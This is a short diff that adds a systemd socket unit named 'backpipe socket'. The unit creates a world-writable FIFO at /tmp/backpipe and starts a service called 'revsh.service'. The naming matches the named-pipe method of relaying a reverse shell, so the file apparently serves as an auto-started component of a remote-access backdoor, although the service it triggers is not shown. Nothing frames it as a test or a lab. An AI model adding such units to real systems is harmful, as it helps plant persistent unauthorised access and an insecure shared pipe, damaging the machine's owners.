@@ -1,0 +1,9 @@
+; https://www.freedesktop.org/software/systemd/man/systemd.socket.html
+[Unit]
+Description=backpipe socket
+
+[Socket]
+ListenFIFO=/tmp/backpipe
+RemoveOnStop=yes
+SocketMode=0666
+Service=revsh.service
